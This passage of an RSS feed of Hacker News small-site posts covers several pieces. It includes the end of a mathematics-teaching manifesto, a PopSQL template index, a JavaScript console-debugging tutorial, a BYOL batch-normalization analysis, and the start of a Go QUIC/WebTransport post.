<p>In Intellectual Mathematics, when facing a new concept, our primary goal is to understand how and why it works. The standard by which this is judged is our own sense of satisfaction and understanding. Emotion, passion, and the joy of insight are therefore essential components of Intellectual Mathematics.</p>
<p>In traditional mathematics, when facing a new concept, the goal is to reach the requisite results without making any technical errors. Crossing the t’s and dotting the i’s are the alpha and omega of traditional mathematics. Traditional mathematics is anti-human. It fetishises robotic manipulation of symbols and involves no emotions except a crippling fear of genuine and free human thought.</p>
<p>In traditional mathematics, the character and bulk of any given proof usually has next to nothing to do with why that particular theorem is true and everything to do with incidental technicalities. Students soon get the hint that mathematics is not about actually thinking and trying to figure stuff out; rather it is clearly a formal game completely divorced from common sense.</p>
<p>Indeed, formal proofs are sometimes accompanied by an informal heuristic argument, only to be followed …</p></div></article></main></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://intellectualmathematics.com/manifesto/">http://intellectualmathematics.com/manifesto/</a></em></p>]]>
            </description>
            <link>http://intellectualmathematics.com/manifesto/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24274186</guid>
            <pubDate>Tue, 25 Aug 2020 18:08:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SQL Templates for Common Product, Sales, Marketing, and Analytics Questions]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24274045">thread link</a>) | @rahilsondhi
<br/>
August 25, 2020 | https://popsql.com/sql-templates | <a href="https://web.archive.org/web/*/https://popsql.com/sql-templates">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>From startups to enterprises, SQL is more powerful when used across teams. Here are foundational templates we've battle-tested at PopSQL. Try them in our <a href="https://popsql.com/sql-templates/analytics/exploring-sample-dataset">sample DB</a>.</p><header><h2>Product</h2></header><div><a href="https://popsql.com/sql-templates/product/monitoring-a-feature-launch-with-sql"><div><h2><img src="https://popsql.com/static/docs/icons/inspect.svg" alt="icon"><div><p>Monitoring a Feature Launch with SQL</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/product/how-has-customer-used-your-product"><div><h2><img src="https://popsql.com/static/docs/icons/inspect.svg" alt="icon"><div><p>Auditing a Customer's Usage of Your Product</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/product/product-most-used-features"><div><h2><img src="https://popsql.com/static/docs/icons/inspect.svg" alt="icon"><div><p>Ranking the Most Used Features in Your Product</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/product/finding-your-most-engaged-users"><div><h2><img src="https://popsql.com/static/docs/icons/inspect.svg" alt="icon"><div><p>Finding Your Product's Most Engaged Users</p><p>-&gt;</p></div></h2></div></a></div><hr><header><h2>Engineering</h2></header><div><a href="https://popsql.com/sql-templates/engineering/filtering-users-by-version-number-with-sql-regex"><div><h2><img src="https://popsql.com/static/docs/icons/schema.svg" alt="icon"><div><p>Filtering Users by Version Number with Regex in SQL</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/engineering/filtering-users-by-platform-in-sql"><div><h2><img src="https://popsql.com/static/docs/icons/schema.svg" alt="icon"><div><p>Filtering Users by Platform in SQL</p><p>-&gt;</p></div></h2></div></a></div><hr><header><h2>Support</h2></header><div><a href="https://popsql.com/sql-templates/support/analyzing-nps-responses-in-sql"><div><h2><img src="https://popsql.com/static/docs/icons/troubleshooting.svg" alt="icon"><div><p>Analyzing NPS Responses in SQL</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/support/finding-customers-at-risk-of-churning"><div><h2><img src="https://popsql.com/static/docs/icons/troubleshooting.svg" alt="icon"><div><p>Finding Customers at Risk of Churning</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/support/detecting-spikes-in-issues-from-support-tickets"><div><h2><img src="https://popsql.com/static/docs/icons/troubleshooting.svg" alt="icon"><div><p>Detecting Spikes in Issues from Support Tickets</p><p>-&gt;</p></div></h2></div></a></div><hr><header><h2>Sales</h2></header><div><a href="https://popsql.com/sql-templates/sales/tagging-sign-up-emails-as-work-vs-personal"><div><h2><img src="https://popsql.com/static/docs/icons/grow.svg" alt="icon"><div><p>Tagging Sign Up Emails as Work vs Personal</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/sales/creating-lead-scores-in-sql"><div><h2><img src="https://popsql.com/static/docs/icons/grow.svg" alt="icon"><div><p>Creating Lead Scores in SQL</p><p>-&gt;</p></div></h2></div></a></div><hr><header><h2>Marketing</h2></header><div><a href="https://popsql.com/sql-templates/marketing/calculating-daily-active-users-in-sql"><div><h2><img src="https://popsql.com/static/docs/icons/announce.svg" alt="icon"><div><p>Calculating Daily Active Users (and digging deeper)</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/marketing/running-a-funnel-analysis"><div><h2><img src="https://popsql.com/static/docs/icons/announce.svg" alt="icon"><div><p>Running a Funnel Analysis in SQL</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/marketing/marketing-attribution-in-sql"><div><h2><img src="https://popsql.com/static/docs/icons/announce.svg" alt="icon"><div><p>Marketing Attribution in SQL</p><p>-&gt;</p></div></h2></div></a></div><hr><header><h2>Analytics</h2></header><div><a href="https://popsql.com/sql-templates/analytics/how-to-create-histograms-in-sql"><div><h2><img src="https://popsql.com/static/docs/icons/analyze.svg" alt="icon"><div><p>Creating Histograms in SQL</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/analytics/detecting-skewness-in-sql"><div><h2><img src="https://popsql.com/static/docs/icons/analyze.svg" alt="icon"><div><p>Detecting Skewness in a Dataset in SQL</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/analytics/linear-regression-in-sql"><div><h2><img src="https://popsql.com/static/docs/icons/analyze.svg" alt="icon"><div><p>Calculating Linear Regression in SQL</p><p>-&gt;</p></div></h2></div></a><a href="https://popsql.com/sql-templates/analytics/exploring-sample-dataset"><div><h2><img src="https://popsql.com/static/docs/icons/analyze.svg" alt="icon"><div><p>Exploring our Sample Dataset</p><p>-&gt;</p></div></h2></div></a></div><hr><p>Want to write or request a new SQL template? <a href="https://airtable.com/shr37S7ciAObk7yk1">Let's talk!</a></p></section></div>]]>
            </description>
            <link>https://popsql.com/sql-templates</link>
            <guid isPermaLink="false">hacker-news-small-sites-24274045</guid>
            <pubDate>Tue, 25 Aug 2020 17:57:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning JavaScript? Series – Debugging like a pro using Console.log()]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24273815">thread link</a>) | @omotola28
<br/>
August 25, 2020 | https://blog.oshogunle.com/learning-javascript-series-debugging-like-a-pro-using-consolelog-ckea828h000k2wks102o6dqqj | <a href="https://web.archive.org/web/*/https://blog.oshogunle.com/learning-javascript-series-debugging-like-a-pro-using-consolelog-ckea828h000k2wks102o6dqqj">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598376418025/o2KPEw6yF.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>One of the ways JavaScript developers debug their code is by using <strong>console.log</strong> to figure out what the output of a particular variable  or condition is. But, what if there is a better way of using this function to give us a better developer experience?</p>
<p>The popular methods to use console.log may look something like this.</p>
<pre><code><span>const</span> blogger1 = {name : <span>"mycodinghabits"</span>, occupation : <span>"software developer"</span>, interest : <span>"dancing"</span>}
<span>const</span> blogger2 = {name : <span>"victoria lo"</span>, occupation : <span>"web developer"</span>, interest : <span>"collecting quotes"</span>}
<span>const</span> blogger3 = {name : <span>"bolaji ayodeji"</span>, occupation : <span>"JAMStack developer"</span>, interest : <span>"sharing knowledge"</span>}

<span>console</span>.log(blogger1)
<span>console</span>.log(blogger2)
<span>console</span>.log(blogger3)
</code></pre><p>And the output on the web browser is</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598375354524/mBgXtzN5w.png?auto=format&amp;q=60" alt="Untitled.png"></p>
<p>From that log we arent sure who is <strong>blogger1, 2 or 3.</strong> This is where we can start to do more with <strong>console.log.</strong> To make this more readable which in turn increases developer happiness,  we can do this instead</p>
<pre><code><span>console</span>.log({blogger1, blogger2, blogger3})
</code></pre><p>which gives us a better output with our variable names. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598375469237/qeKNMcZOi.png?auto=format&amp;q=60" alt="Untitled 1.png"></p>
<p>Or even better, if our object has the same properties we can use.</p>
<h2 id="consoletable">Console.table</h2>
<pre><code>
<span>console</span>.table([blogger1, blogger2, blogger3])


<span>console</span>.table({blogger1, blogger2, blogger3})
</code></pre><p>This gives us
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598375525122/ExahwpS8p.png?auto=format&amp;q=60" alt="Untitled 2.png"></p>
<p>The first example is useful when you have </p>
<ul>
<li>an array of objects</li>
</ul>
<p>and the second when you have </p>
<ul>
<li>objects embedded in another object.</li>
</ul>
<p>Thats cool, but whats even cooler is if I wanted to log performance of a piece of code  which iterates over an array of my objects, I can do this using <strong>console.time</strong>.</p>
<h2 id="consoletime">Console.time</h2>
<p>In this example, I am trying to compare the performance of using maps instead of for loops. Check out all I had to say about this in this <a target="_blank" href="https://blog.oshogunle.com/learning-javascript-topic-higher-order-functions-ckdvlkqxs0151jas1fl8tdx13">article</a></p>
<pre><code><span>const</span> blogger1 = {name : <span>"mycodinghabits"</span>, occupation : <span>"software developer"</span>, interest : <span>"dancing"</span>}
<span>const</span> blogger2 = {name : <span>"victoria lo"</span>, occupation : <span>"web developer"</span>, interest : <span>"collecting quotes"</span>}
<span>const</span> blogger3 = {name : <span>"bolaji ayodeji"</span>, occupation : <span>"JAMStack developer"</span>, interest : <span>"sharing knowledge"</span>}

<span>let</span> array0fObjects = [blogger1, blogger2, blogger3];




<span>console</span>.time(<span>"timer for loops"</span>)

<span>for</span>(i = <span>0</span>; i &lt; array0fObjects.length; i++) {
    <span>console</span>.log(<span>`%c Hi <span>${array0fObjects[i].name}</span>`</span>, <span>"color: green; font-weight: bold; background-color: black"</span>)
}

<span>console</span>.timeEnd(<span>"timer for loops"</span>)


<span>console</span>.time(<span>"timer for maps"</span>)

array0fObjects.map(<span><span>v</span> =&gt;</span> <span>console</span>.log(<span>`%c <span>${v.name}</span> likes <span>${v.interest}</span>`</span>, <span>"color: yellow; font-weight: bold; background-color: black"</span>))

<span>console</span>.timeEnd(<span>"timer for maps"</span>)
</code></pre><p>The output</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598375674441/G47tjtcZM.png?auto=format&amp;q=60" alt="Untitled 3.png"></p>
<blockquote>
<p>Bonus - Here you can see that my console logs are prettier, this is because the string formatting I applied using the %c allows me to add styling like you would do in css. Try it!</p>
</blockquote>
<h2 id="consoletrace">Console.trace</h2>
<p>Have you ever had a bug in your code and wanted to figure out where in your code execution your function was being called? Great! We can use <strong>console.trace</strong> to do this. </p>
<pre><code><span>const</span> loopBloggers = <span><span>()</span> =&gt;</span> {
    <span>for</span>(i = <span>0</span>; i &lt; array0fObjects.length; i++) {
        <span>console</span>.log(<span>`%c Hi <span>${array0fObjects[i].name}</span>`</span>, <span>"color: green; font-weight: bold; background-color: black"</span>)
    }

    
    mapBloggers();
}

<span>const</span> mapBloggers = <span><span>()</span> =&gt;</span> {

    <span>console</span>.trace(<span>"I was called here"</span>)

    array0fObjects.map(<span><span>v</span> =&gt;</span> <span>console</span>.log(<span>`%c <span>${v.name}</span> likes <span>${v.interest}</span>`</span>, <span>"color: yellow; font-weight: bold; background-color: black"</span>))
}

loopBloggers();
</code></pre><p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598375742138/k_lLbDYVZ.png?auto=format&amp;q=60" alt="Untitled 4.png"></p>
<p>Keeping in mind that the call stack follows a <a target="_blank" href="https://www.freecodecamp.org/news/understanding-the-javascript-call-stack-861e41ae61d4/">Last In, First Out Principle</a>, and in this case loopBloggers was pushed into the stack first followed by mapBloggers.</p>
<h2 id="consoleassert">Console.assert</h2>
<p>If you want a fancy way of logging errors from your conditinal statements in Javascript, you can use <strong>console.assert</strong> to do this.</p>
<pre><code><span>let</span> isPostHelpful = <span>true</span>;

 <span>if</span>(isPostHelpful == <span>true</span>){
    <span>console</span>.log(<span>"%c Please share or react to it 👏🏾"</span>, 
                <span>"color: black; font-weight: bold; background-color:yellow"</span>)
 }
 <span>else</span>{
     <span>console</span>.assert(<span>false</span>, <span>"Comment below what you would like to see in this series"</span>)
 }
</code></pre><h3 id="isposthelpful-true">isPostHelpful == true</h3>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598375798625/8ozkMrlg-.png?auto=format&amp;q=60" alt="Untitled 5.png"></p>
<h3 id="isposthelpful-false">isPostHelpful == false</h3>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598375817086/u50JOLRbv.png?auto=format&amp;q=60" alt="Untitled 6.png"></p>
<p>If you want to take your debugging skills to an even higher level, you can use the browser debug tools as demonstrated <a target="_blank" href="https://www.youtube.com/watch?v=H0XScE08hy8">here</a>. </p>
<blockquote>
<p>BONUS - If doing that doesn't help maybe the LOGIC is wrong, consider rubber ducking. This is a technique that is used to work through your code line by line by telling a rubber duck what you think your code should be doing. That way you might find flaws in your logic or your code. </p>
</blockquote>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598376275398/K1cuVemte.gif?auto=format,compress&amp;gif-q=60" alt="Animated GIF-downsized_large.gif"></p>
<p>Thank you for reading! Hope you learn something new! Like, share, react to the post so others can see it.</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.oshogunle.com/learning-javascript-series-debugging-like-a-pro-using-consolelog-ckea828h000k2wks102o6dqqj</link>
            <guid isPermaLink="false">hacker-news-small-sites-24273815</guid>
            <pubDate>Tue, 25 Aug 2020 17:35:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding self-supervised/contrastive learning w Bootstrap Your Own Latent]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24273792">thread link</a>) | @christinakim
<br/>
August 25, 2020 | https://untitled-ai.github.io/understanding-self-supervised-contrastive-learning.html | <a href="https://web.archive.org/web/*/https://untitled-ai.github.io/understanding-self-supervised-contrastive-learning.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    

<p>Unlike prior work like SimCLR and MoCo, the recent paper <a href="http://arxiv.org/abs/2006.07733">Bootstrap Your Own Latent</a> (BYOL) from <a href="https://deepmind.com/">DeepMind</a> demonstrates a state of the art method for self-supervised learning of image representations without an explicitly contrastive loss function. This simplifies training by removing the need for negative examples in the loss function. We highlight two surprising findings from our work on reproducing BYOL:</p>

<p><strong>(1) BYOL generally performs no better than random when batch normalization is removed, and</strong></p>

<p><strong>(2) the presence of batch normalization implicitly causes a form of contrastive learning</strong>.</p>

<p>These findings highlight the importance of contrast between positive and negative examples when learning representations and help us gain a more fundamental understanding of how and why self-supervised learning works.</p>

<p>The code used for this post can be found at <a href="https://github.com/untitled-ai/self_supervised">https://github.com/untitled-ai/self_supervised</a>.</p>

<!--more-->



<p>Machine learning is typically done in a <em>supervised</em> fashion: we use a dataset consisting of the inputs and “right answers” (outputs) to find the best function that maps from the input data onto the right answers. By contrast, in <em>self-supervised</em> <sup id="fnref:ssup" role="doc-noteref"><a href="#fn:ssup">1</a></sup>  learning, no right answers are provided in the data set. Instead, we learn a function that maps the input data onto itself (ex: using the right half of an image to predict the left half of an image).</p>

<p>This approach has proven successful in everything from language to images and audio. In fact, most recent language models, from <a href="http://jalammar.github.io/illustrated-word2vec/">word2vec</a> to <a href="http://jalammar.github.io/illustrated-bert/">BERT</a> and <a href="https://arxiv.org/abs/2005.14165">GPT-3</a>, are examples of self-supervised approaches. More recently, this approach has had some incredible results for audio and images as well, and <a href="https://cacm.acm.org/news/244720-yann-lecun-yoshua-bengio-self-supervised-learning-is-key-to-human-level-intelligence/fulltext">some believe</a> that it may be an important component of human-like intelligence. This post focuses on self-supervised learning for image representations. For more background on self-supervised learning, see the resources below <sup id="fnref:resources" role="doc-noteref"><a href="#fn:resources">2</a></sup>.</p>



<h3 id="contrastive-learning">Contrastive learning</h3>

<p>Until <a href="https://arxiv.org/abs/2006.07733">BYOL</a> was published a few months ago, the best performing algorithms were <a href="http://arxiv.org/abs/1911.05722">MoCo</a> and <a href="http://arxiv.org/abs/2002.05709">SimCLR</a>. MoCo and SimCLR are both examples of <em>contrastive learning</em>.</p>

<p>Contrastive learning is the process of training a classifier to distinguish between “similar” and “dissimilar” input data. For MoCo and SimCLR specifically, the classifier’s positive examples are modified versions of the same image, while negative examples are other images in the same data set. For example, suppose there is a picture of a dog. In that case, the positive examples could be different crops of that image (see below figure), while the negative examples could be crops from entirely different images.</p>

<figure>
  <img src="https://untitled-ai.github.io/assets/img/understanding_self_supervised/dog_aug.png" alt="Dog augmentations">
  <figcaption>Augmented versions of the original picture of a dog (a). Any two of these could be used as a positive example pair. Image from the <a href="https://ai.googleblog.com/2020/04/advancing-self-supervised-and-semi.html">SimCLR post</a>.</figcaption>
</figure>

<h3 id="byol-self-supervised-learning-without-contrastive-learning-not-exactly">BYOL: self-supervised learning without contrastive learning? Not exactly.</h3>

<p>While MoCo and SimCLR use contrastive learning between positive and negative examples in their loss functions, BYOL uses only positive examples in the loss function. At first glance, BYOL appears to be doing self-supervised learning without contrasting between different images at all. However, it appears that the primary reason BYOL works is that it is doing a form of contrastive learning — just via an indirect mechanism.</p>

<p>To more deeply understand this indirect contrastive learning in BYOL, we should first review how each of these algorithms works. See <a href="https://untitled-ai.github.io/appendix-for-understanding-self-supervised-contrastive-learning.html#appendix-a">Appendix A</a> for a table that shows the notation used in each of the papers. In this post, we use the notation from BYOL for consistency.</p>

<h3 id="simclr">SimCLR</h3>

<p>SimCLR is a particularly elegant self-supervised algorithm that managed to simplify previous approaches to their essential core and improve upon their performance. Two transformations <em>v</em> and <em>v’</em> of the same image <em>x</em> are fed through the same network to produce two projections <em>z</em> and <em>z’</em>. The contrastive loss aims to maximize the similarity of the two projections from the same input $x$ while minimizing the similarity to projections of other images within the same mini-batch. Continuing our dog example, projections of different crops of the same dog image would hopefully be more similar than crops from other random images in the same batch.</p>

<p>The multilayer perceptron (MLP) used for projection in SimCLR uses batch normalization after each linear layer.</p>

<figure>
  <img src="https://untitled-ai.github.io/assets/img/understanding_self_supervised/simclr_arch.png" alt="SimCLR architecture">
  <figcaption>SimCLR architecture.</figcaption>
</figure>

<h3 id="moco">MoCo</h3>

<p>Relative to SimCLR, MoCo v2 manages to both decrease the batch size (from 4096 to 256) and improve the performance. Unlike SimCLR, where the top and bottom row in the diagram represent the same network (parameterized by $\theta$), MoCo splits the single network into an <em>online network</em> (top row) parameterized by $\theta$ and a <em>momentum network</em> (bottom row) parameterized by $\xi$. The online network is updated by stochastic gradient descent, while the momentum network is updated based on an exponential moving average of the online network weights. The momentum network allows MoCo to efficiently use a memory bank of past projections as negative examples for the contrastive loss. This memory bank is what enables the much smaller batch sizes. In our dog image illustration, the positive examples would be crops of the same image of a dog. The negative examples are completely different images that were used in past mini-batches, projections of which are stored in the memory bank.</p>

<p>The MLP used for projection in <a href="http://arxiv.org/abs/2003.04297">MoCo v2</a> does not use batch normalization</p>

<figure>
  <img src="https://untitled-ai.github.io/assets/img/understanding_self_supervised/moco_v2_arch.png" alt="MoCo v2 architecture">
  <figcaption>MoCo v2 architecture. Top row is online encoder, bottom row is momentum encoder.</figcaption>
</figure>

<h3 id="byol">BYOL</h3>

<p>BYOL builds on the momentum network concept of MoCo, adding an MLP $q_\theta$ to predict z’ from z. Rather than using a contrastive loss, BYOL uses the L2 error between the normalized prediction p and target z’. Using our dog image example, BYOL tries to convert both crops of the dog image into the same representation vector (make p and z’ equal.) Because this loss function does not require negative examples, there is no use for a memory bank in BYOL.</p>

<p>Both MLPs in BYOL use batch normalization after the first linear layer only.</p>

<figure>
  <img src="https://untitled-ai.github.io/assets/img/understanding_self_supervised/byol_arch.png" alt="BYOL architecture">
  <figcaption>BYOL architecture.</figcaption>
</figure>

<p>By the above description, it appears that BYOL can learn without explicitly contrasting between multiple different images. <strong>Surprisingly, however, we found that BYOL is not only doing contrastive learning, but that contrastive learning is essential to its success</strong>.</p>



<p>We originally implemented BYOL in PyTorch using code we had written for MoCo. When we began training our network, we found that <strong>our network performed no better than random</strong>. Comparing our code to <a href="https://github.com/sthalles/PyTorch-BYOL">another available implementation</a> (thanks sthalles!), we discovered we were missing batch normalization in the MLP. We were quite surprised that batch normalization was critical to training BYOL, while MoCo v2 did not require it at all.</p>

<p>For our initial testing, we trained a ResNet-18 with BYOL on the STL-10 unsupervised dataset using SGD with momentum and a batch size of 256 <sup id="fnref:opt" role="doc-noteref"><a href="#fn:opt">3</a></sup>. See <a href="https://untitled-ai.github.io/appendix-for-understanding-self-supervised-contrastive-learning.html#appendix-b">Appendix B</a> for details on data augmentation. Below are the first ten epochs of training for the same BYOL algorithm with and without batch normalization in the MLPs</p>

<figure>
  <img src="https://untitled-ai.github.io/assets/img/understanding_self_supervised/surprising_stl10_10e.png" alt="MoCo v2 architecture">
  <figcaption>Linear evaluation accuracy on a validation set during early training of a ResNet-18 on STL10. When BYOL was trained without batch normalization in the MLP, the performance remained no better than a random baseline.</figcaption>
</figure>

<h3 id="why-did-this-happen">Why did this happen?</h3>

<p>To investigate the cause of this dramatic change in performance, we performed some additional experiments.</p>

<figure>
  <img src="https://untitled-ai.github.io/assets/img/understanding_self_supervised/contrastive_loss_arch.png" alt="Contrastive loss architecture">
  <figcaption>Configuration used for experiments with contrastive loss, enabling better comparison to BYOL results.</figcaption>
</figure>

<p>Because the prediction MLP q changes the network depth compared to MoCo, we wondered if batch normalization might be needed to regularize this network. That is, while MoCo <em>does not</em> require batch normalization, it could be that MoCo <em>does</em> require batch normalization when paired with an additional prediction MLP. To test this, we started training the network shown above with a contrastive loss function. We found that the network was able to perform significantly better than random within ten epochs. This result made us suspect that something about <strong>not using a contrastive loss function</strong> causes the dependence of training on batch normalization.</p>

<p>We then wondered whether another type of normalization would have the same effect. We applied Layer Normalization to the MLPs instead of batch normalization and trained the network with BYOL <sup id="fnref:layernorm" role="doc-noteref"><a href="#fn:layernorm">4</a></sup>. As in the experiments where MLPs had no normalization, the performance was no better than random. This result told us that <strong>the activations of other inputs in the same mini-batch</strong> are essential in helping BYOL find useful representations.</p>

<p>Next, we wanted to know whether batch normalization is required in the projection MLP $g$, the prediction MLP $q$, or both. Our experiments showed that batch normalization is most useful in the projection MLP, but the network can learn useful representations with batch normalization in either MLP. A <strong>single batch normalization layer</strong> in one of the MLPs is sufficient for the network to learn.</p>

<h3 id="performance-for-each-variation">Performance for each variation</h3>

<table>
  <thead>
    <tr>
      <th>Name</th>
      <th>Projection MLP Norm</th>
      <th>Prediction MLP Norm</th>
      <th>Loss Function</th>
      <th>Contrastive</th>
      <th>Performance</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Contrastive Loss</td>
      <td>None</td>
      <td>None</td>
      <td>Cross Entropy</td>
      <td>Explicit</td>
      <td>44.1</td>
    </tr>
    <tr>
      <td>BYOL</td>
      <td>Batch Norm</td>
      <td>Batch Norm</td>
      <td>L2</td>
      <td>Implicit</td>
      <td>57.7</td>
    </tr>
    <tr>
      <td>Projection BN Only</td>
      <td>Batch Norm</td>
      <td>None</td>
      <td>L2</td>
      <td>Implicit</td>
      <td>55.3</td>
    </tr>
    <tr>
      <td>Prediction BN Only</td>
      <td>None</td>
      <td>Batch Norm</td>
      <td>L2</td>
      <td>Implicit</td>
      <td>48</td>
    </tr>
    <tr>
      <td>No Normalization</td>
      <td>None</td>
      <td>None</td>
      <td>L2</td>
      <td>None</td>
      <td>28.3</td>
    </tr>
    <tr>
      <td>Layer Norm</td>
      <td>Layer Norm</td>
      <td>Layer Norm</td>
      <td>L2</td>
      <td>None</td>
      <td>29.4</td>
    </tr>
    <tr>
      <td>Random</td>
      <td>—</td>
      <td>—</td>
      <td>—</td>
      <td>None</td>
      <td>28.8</td>
    </tr>
  </tbody>
</table>

<p>To summarize the findings so far: in the absence of a contrastive loss function, the success of BYOL training hinges on something about a single batch normalization layer related to the activations from other inputs in the mini-batch.</p>

<h3 id="why-batch-normalization-is-critical-in-byol-mode-collapse">Why batch normalization is critical in BYOL: mode collapse</h3>

<p>One purpose of negative examples in a contrastive loss function is to prevent mode collapse<sup id="fnref:collapse" role="doc-noteref"><a href="#fn:collapse">5</a></sup>. An example of mode collapse would be a network that always outputs [1, 0, 0, 0, …] as its projection vector <em>z</em>. If all projection vectors <em>z</em> are the same, then the network only needs to learn the identity function for $q$ in order to …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://untitled-ai.github.io/understanding-self-supervised-contrastive-learning.html">https://untitled-ai.github.io/understanding-self-supervised-contrastive-learning.html</a></em></p>]]>
            </description>
            <link>https://untitled-ai.github.io/understanding-self-supervised-contrastive-learning.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24273792</guid>
            <pubDate>Tue, 25 Aug 2020 17:33:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Experimenting with QUIC and WebTransport in Go]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24273371">thread link</a>) | @FZambia
<br/>
August 25, 2020 | https://centrifugal.github.io/centrifugo/blog/quic_web_transport/ | <a href="https://web.archive.org/web/*/https://centrifugal.github.io/centrifugo/blog/quic_web_transport/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-md-component="main">
        <div>
          
            
              
            
            
              
            
          
          <div>
            <article>
              

                
                  <a href="https://github.com/centrifugal/centrifugo/edit/master/docs/content/blog/quic_web_transport.md" title="Edit this page">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"></path></svg>
                  </a>
                
                
                  
                
                
                
<p><img alt="post-cover" src="https://i.imgur.com/sH9zfhe.jpg"></p>
<h2 id="overview">Overview<a href="#overview" title="Permanent link">¶</a></h2>
<p>WebTransport is a new browser API offering low-latency, bidirectional, client-server messaging. If you have not heard about it before I suggest to first read a post called <a href="https://web.dev/quictransport/">Experimenting with QuicTransport</a> published recently on web.dev – it gives a nice overview to WebTransport and shows client-side code examples. Here we will concentrate on implementing server side.</p>
<p>Some key points about WebTransport spec:</p>
<ul>
<li>WebTransport standard will provide a possibility to use streaming client-server communication using modern transports such as <a href="https://en.wikipedia.org/wiki/QUIC">QUIC</a> and <a href="https://en.wikipedia.org/wiki/HTTP/3">HTTP/3</a></li>
<li>It can be a good alternative to <a href="https://en.wikipedia.org/wiki/WebSocket">WebSocket</a> messaging, standard provides some capabilities that are not possible with current WebSocket spec: possibility to get rid of head-of-line blocking problems using individual streams for different data, the possibility to reuse a single connection to a server in different browser tabs</li>
<li>WebTransport also defines an unreliable stream API using UDP datagrams (which is possible since QUIC is UDP-based) – which is what browsers did not have before without a rather complex <a href="https://en.wikipedia.org/wiki/WebRTC">WebRTC</a> setup involving ICE, STUN, etc. This is sweet for in-browser real-time games.</li>
</ul>
<p>To help you figure out things here are links to current WebTransport specs:</p>
<ul>
<li><a href="https://tools.ietf.org/html/draft-vvv-webtransport-overview-01">WebTransport overview</a> – this spec gives an overview of WebTransport and provides requirements to transport layer</li>
<li><a href="https://tools.ietf.org/html/draft-vvv-webtransport-quic">WebTransport over QUIC</a> – this spec describes QUIC-based transport for WebTransport</li>
<li><a href="https://tools.ietf.org/html/draft-vvv-webtransport-http3">WebTransport over HTTP/3</a> – this spec describes HTTP/3-based transport for WebTransport (actually HTTP/3 is a protocol defined on top of QUIC)</li>
</ul>
<p>At moment Chrome only implements <a href="https://web.dev/quictransport/#register-for-ot">trial possibility</a> to try out WebTransport standard and only implements WebTransport over QUIC. Developers can initialize transport with code like this:</p>
<div><pre><span></span><code><span>const</span> <span>transport</span> <span>=</span> <span>new</span> <span>QuicTransport</span><span>(</span><span>'quic-transport://localhost:4433/path'</span><span>);</span>
</code></pre></div>

<p>In case of HTTP/3 transport one will use URL like <code>'https://localhost:4433/path'</code> in transport constructor. All WebTransport underlying transports should support instantiation over URL – that's one of the spec requirements. </p>
<p>I decided that this is a cool possibility to finally play with QUIC protocol and its Go implementation <a href="https://github.com/lucas-clemente/quic-go">github.com/lucas-clemente/quic-go</a>.</p>
<div>
<p>Danger</p>
<p>Please keep in mind that all things described in this post are work in progress. WebTransport drafts, Quic-Go library, even QUIC protocol itself are subjects to change. You should not use it in production yet.</p>
</div>
<p><a href="https://web.dev/quictransport/">Experimenting with QuicTransport</a> post contains links to a <a href="https://googlechrome.github.io/samples/quictransport/client.html">client example</a> and companion <a href="https://github.com/GoogleChrome/samples/blob/gh-pages/quictransport/quic_transport_server.py">Python server implementation</a>.</p>
<p><img alt="client example" src="https://i.imgur.com/Hty00aG.png"></p>
